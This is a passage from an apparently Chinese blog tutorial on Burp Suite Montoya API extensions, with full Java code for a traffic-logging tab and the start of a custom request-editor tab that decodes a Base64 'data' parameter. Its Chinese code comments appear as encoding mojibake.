continueWith(updatedHostHeaderRequest);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> continueWith(httpRequestToBeSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived httpResponseReceived)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseReceivedAction.continueWith(httpResponseReceived);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Custom-Logger-Example-Extension"><a href="#Custom-Logger-Example-Extension" class="headerlink" title="Custom Logger Example Extension"></a>Custom Logger Example Extension</h2><p>Adds a new tab to Burpâ€™s UI and displays a log of HTTP traffic for all Burp tools.</p><hr><p>This extension provides a suite-wide HTTP logger within the main Burp UI.</p><p>The extension uses the following techniques:</p><ul><li>It creates a custom tab within the main Burp UI, in which to display logging user interface</li><li>It displays a table of items and a read-only editor for requests and responses within a splitpane</li><li>When an item passes through the HttpHandler, it gets added to the table</li><li>You can view the request and response for an item in the table by clicking on the relevant row</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼•å…¥æ‰€éœ€çš„ç±»å’Œæ¥å£</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.HttpResponseReceived;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.UserInterface;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.HttpRequestEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.HttpResponseEditor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç¼–è¾‘å™¨ä¸ºåªè¯»</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° BurpExtension æ¥å£çš„ CustomLogger ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomLogger</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;  <span class="comment">// å­˜å‚¨ MontoyaApi å®ä¾‹</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Custom logger&quot;</span>);  <span class="comment">// è®¾ç½®æ’ä»¶çš„åç§°</span></span><br><span class="line"></span><br><span class="line">        <span class="type">MyTableModel</span> <span class="variable">tableModel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyTableModel</span>();  <span class="comment">// åˆ›å»ºè¡¨æ ¼æ¨¡å‹å®ä¾‹</span></span><br><span class="line">        api.userInterface().registerSuiteTab(<span class="string">&quot;Custom logger&quot;</span>, constructLoggerTab(tableModel));  <span class="comment">// æ³¨å†Œæ’ä»¶UIåˆ°Burpçš„æ ‡ç­¾é¡µ</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>(tableModel));  <span class="comment">// æ³¨å†ŒHTTPå¤„ç†å™¨æ¥è®°å½•å“åº”</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„å»ºæ—¥å¿—æ ‡ç­¾é¡µçš„æ–¹æ³•ï¼Œæ¥å—ä¸€ä¸ª MyTableModel å¯¹è±¡ä½œä¸ºå‚æ•°</span></span><br><span class="line">    <span class="keyword">private</span> Component <span class="title function_">constructLoggerTab</span><span class="params">(MyTableModel tableModel)</span> &#123;</span><br><span class="line">        <span class="type">JSplitPane</span> <span class="variable">splitPane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSplitPane</span>(JSplitPane.VERTICAL_SPLIT);  <span class="comment">// åˆ›å»ºå‚ç›´åˆ†å‰²é¢æ¿</span></span><br><span class="line"></span><br><span class="line">        <span class="type">JTabbedPane</span> <span class="variable">tabs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTabbedPane</span>();  <span class="comment">// åˆ›å»ºæ ‡ç­¾é¡µå®¹å™¨</span></span><br><span class="line"></span><br><span class="line">        <span class="type">UserInterface</span> <span class="variable">userInterface</span> <span class="operator">=</span> api.userInterface();</span><br><span class="line">        <span class="type">HttpRequestEditor</span> <span class="variable">requestViewer</span> <span class="operator">=</span> userInterface.createHttpRequestEditor(READ_ONLY);  <span class="comment">// åˆ›å»ºè¯·æ±‚ç¼–è¾‘å™¨ï¼Œè®¾ç½®ä¸ºåªè¯»</span></span><br><span class="line">        <span class="type">HttpResponseEditor</span> <span class="variable">responseViewer</span> <span class="operator">=</span> userInterface.createHttpResponseEditor(READ_ONLY);  <span class="comment">// åˆ›å»ºå“åº”ç¼–è¾‘å™¨ï¼ŒåŒæ ·è®¾ç½®ä¸ºåªè¯»</span></span><br><span class="line"></span><br><span class="line">        tabs.addTab(<span class="string">&quot;Request&quot;</span>, requestViewer.uiComponent());  <span class="comment">// æ·»åŠ è¯·æ±‚ç¼–è¾‘å™¨åˆ°æ ‡ç­¾é¡µ</span></span><br><span class="line">        tabs.addTab(<span class="string">&quot;Response&quot;</span>, responseViewer.uiComponent());  <span class="comment">// æ·»åŠ å“åº”ç¼–è¾‘å™¨åˆ°æ ‡ç­¾é¡µ</span></span><br><span class="line"></span><br><span class="line">        splitPane.setRightComponent(tabs);  <span class="comment">// è®¾ç½®åˆ†å‰²é¢æ¿çš„å³ä¾§ç»„ä»¶ä¸ºæ ‡ç­¾é¡µ</span></span><br><span class="line"></span><br><span class="line">        <span class="type">JTable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTable</span>(tableModel) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">changeSelection</span><span class="params">(<span class="type">int</span> rowIndex, <span class="type">int</span> columnIndex, <span class="type">boolean</span> toggle, <span class="type">boolean</span> extend)</span> &#123;</span><br><span class="line">                <span class="comment">// é€‰æ‹©è¡¨æ ¼è¡Œæ—¶æ˜¾ç¤ºç›¸åº”çš„HTTPè¯·æ±‚å’Œå“åº”</span></span><br><span class="line">                <span class="type">HttpResponseReceived</span> <span class="variable">responseReceived</span> <span class="operator">=</span> tableModel.get(rowIndex);</span><br><span class="line">                requestViewer.setRequest(responseReceived.initiatingRequest());</span><br><span class="line">                responseViewer.setResponse(responseReceived);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">super</span>.changeSelection(rowIndex, columnIndex, toggle, extend);  <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•å¤„ç†é€‰æ‹©é€»è¾‘</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">JScrollPane</span> <span class="variable">scrollPane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(table);  <span class="comment">// å°†è¡¨æ ¼æ”¾åœ¨æ»šåŠ¨çª—æ ¼ä¸­</span></span><br><span class="line"></span><br><span class="line">        splitPane.setLeftComponent(scrollPane);  <span class="comment">// è®¾ç½®åˆ†å‰²é¢æ¿çš„å·¦ä¾§ç»„ä»¶ä¸ºæ»šåŠ¨çª—æ ¼</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> splitPane;  <span class="comment">// è¿”å›æ„å»ºå¥½çš„ç»„ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° HttpHandler æ¥å£çš„ MyHttpHandler ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MyTableModel tableModel; <span class="comment">// ç§æœ‰æœ€ç»ˆæˆå‘˜å˜é‡ï¼Œç”¨äºå­˜å‚¨å¼•ç”¨åˆ° MyTableModel å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œæ¥æ”¶ä¸€ä¸ª MyTableModel å®ä¾‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyHttpHandler</span><span class="params">(MyTableModel tableModel)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.tableModel = tableModel; <span class="comment">// å­˜å‚¨ä¼ å…¥çš„ MyTableModel å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤„ç†å³å°†å‘é€çš„ HTTP è¯·æ±‚çš„æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent requestToBeSent)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–¹æ³•ç›®å‰ä»…å°†è¯·æ±‚ç»§ç»­ä¼ é€’å‡ºå»ï¼Œæ²¡æœ‰è¿›è¡Œä¿®æ”¹æˆ–å…¶ä»–å¤„ç†</span></span><br><span class="line">        <span class="keyword">return</span> RequestToBeSentAction.continueWith(requestToBeSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤„ç†æ¥æ”¶åˆ°çš„ HTTP å“åº”çš„æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived responseReceived)</span></span><br><span class="line">    &#123;</span><br><span class="line">        tableModel.add(responseReceived); <span class="comment">// å°†æ¥æ”¶åˆ°çš„å“åº”æ·»åŠ åˆ°è¡¨æ ¼æ¨¡å‹ä¸­ï¼Œç”¨äºæ—¥å¿—è®°å½•</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–¹æ³•ä¹Ÿå°†å“åº”ç»§ç»­ä¼ é€’å‡ºå»ï¼Œç¡®ä¿å…¶ä»–å¯èƒ½çš„å¤„ç†å™¨æˆ– Burp æœ¬èº«å¯ä»¥è¿›ä¸€æ­¥å¤„ç†å“åº”</span></span><br><span class="line">        <span class="keyword">return</span> ResponseReceivedAction.continueWith(responseReceived);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.HttpResponseReceived;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.table.AbstractTableModel;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»§æ‰¿è‡ª AbstractTableModel çš„ MyTableModel ç±»ï¼Œç”¨äºç®¡ç†å’Œæ˜¾ç¤º HTTP å“åº”æ•°æ®</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTableModel</span> <span class="keyword">extends</span> <span class="title class_">AbstractTableModel</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;HttpResponseReceived&gt; log; <span class="comment">// ç§æœ‰æœ€ç»ˆåˆ—è¡¨ï¼Œç”¨äºå­˜å‚¨ HttpResponseReceived å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ– log åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyTableModel</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.log = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–è¡¨æ ¼çš„è¡Œæ•°ï¼Œç­‰äº log åˆ—è¡¨çš„å¤§å°</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getRowCount</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> log.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–è¡¨æ ¼çš„åˆ—æ•°ï¼Œè¿™é‡Œå›ºå®šä¸º 2 åˆ—</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getColumnCount</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®åˆ—ç´¢å¼•è·å–åˆ—å</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColumnName</span><span class="params">(<span class="type">int</span> column)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">switch</span> (column)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span> -&gt; <span class="string">&quot;Tool&quot;</span>; <span class="comment">// ç¬¬ä¸€åˆ—æ˜¾ç¤ºä½¿ç”¨çš„å·¥å…·</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span> -&gt; <span class="string">&quot;URL&quot;</span>;  <span class="comment">// ç¬¬äºŒåˆ—æ˜¾ç¤ºè¯·æ±‚çš„ URL</span></span><br><span class="line">                    <span class="keyword">default</span> -&gt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æŒ‡å®šå•å…ƒæ ¼çš„å€¼ï¼Œç”¨äºè¡¨æ ¼æ˜¾ç¤º</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Object <span class="title function_">getValueAt</span><span class="params">(<span class="type">int</span> rowIndex, <span class="type">int</span> columnIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">HttpResponseReceived</span> <span class="variable">responseReceived</span> <span class="operator">=</span> log.get(rowIndex);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">switch</span> (columnIndex)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span> -&gt; responseReceived.toolSource().toolType(); <span class="comment">// ç¬¬ä¸€åˆ—æ˜¾ç¤ºå·¥å…·ç±»å‹</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span> -&gt; responseReceived.initiatingRequest().url(); <span class="comment">// ç¬¬äºŒåˆ—æ˜¾ç¤ºè¯·æ±‚ URL</span></span><br><span class="line">                    <span class="keyword">default</span> -&gt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ ä¸€ä¸ªæ–°çš„ HttpResponseReceived å¯¹è±¡åˆ° log åˆ—è¡¨ï¼Œå¹¶é€šçŸ¥è¡¨æ ¼æœ‰æ–°è¡Œæ’å…¥</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(HttpResponseReceived responseReceived)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> log.size();</span><br><span class="line">        log.add(responseReceived);</span><br><span class="line">        fireTableRowsInserted(index, index); <span class="comment">// è§¦å‘è¡¨æ ¼æ›´æ–°äº‹ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®è¡Œç´¢å¼•è·å– HttpResponseReceived å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HttpResponseReceived <span class="title function_">get</span><span class="params">(<span class="type">int</span> rowIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> log.get(rowIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/tools/burpsuite-plugins/image-4.png" alt="ä¸Šé¢åˆ›å»ºçš„é¢æ¿ç•Œé¢å¦‚å›¾æ‰€ç¤º"></p><h2 id="Custom-Request-Editor-Tab-Example-Extension"><a href="#Custom-Request-Editor-Tab-Example-Extension" class="headerlink" title="Custom Request Editor Tab Example Extension"></a>Custom Request Editor Tab Example Extension</h2><p>Adds a new tab to Burpâ€™s HTTP message editor, in order to handle a data serialization format</p><hr><p>This extension provides a new tab on the message editor for requests that contain a specified parameter.</p><p>The extension uses the following techniques:</p><ul><li>It creates a custom request tab on the message editor, provided that the <code>data</code> parameter is present</li><li>If it is appropriate, the editor is set to be read-only</li><li>The value of the <code>data</code> parameter is deserialized (URL decoded, then Base64 decoded) and displayed in the custom tab</li><li>If the value of the data is modified, the content will be re-serialized (Base64 encoded then URL encoded) and updated in the HttpRequest</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.EditorCreationContext;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.HttpRequestEditorProvider;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° HttpRequestEditorProvider æ¥å£çš„ MyHttpRequestEditorProvider ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHttpRequestEditorProvider</span> <span class="keyword">implements</span> <span class="title class_">HttpRequestEditorProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api; <span class="comment">// ç§æœ‰æœ€ç»ˆå­—æ®µï¼Œç”¨äºå­˜å‚¨ MontoyaApi å®ä¾‹</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œæ¥æ”¶ä¸€ä¸ª MontoyaApi å®ä¾‹</span></span><br><span class="line">    MyHttpRequestEditorProvider(MontoyaApi api)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æä¾›è‡ªå®šä¹‰çš„ HTTP è¯·æ±‚ç¼–è¾‘å™¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ExtensionProvidedHttpRequestEditor <span class="title function_">provideHttpRequestEditor</span><span class="params">(EditorCreationContext creationContext)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// è¿”å›ä¸€ä¸ªæ–°åˆ›å»ºçš„ MyExtensionProvidedHttpRequestEditor å®ä¾‹</span></span><br><span class="line">        <span class="comment">// ä¼ é€’ MontoyaApi å®ä¾‹å’Œç¼–è¾‘å™¨åˆ›å»ºä¸Šä¸‹æ–‡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyExtensionProvidedHttpRequestEditor</span>(api, creationContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.ByteArray;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.HttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.ParsedHttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.Selection;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.EditorOptions;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.RawEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.EditorCreationContext;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.EditorMode;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Base64EncodingOptions;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.URLUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.ByteArray.byteArray;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ªå®šä¹‰ HTTP 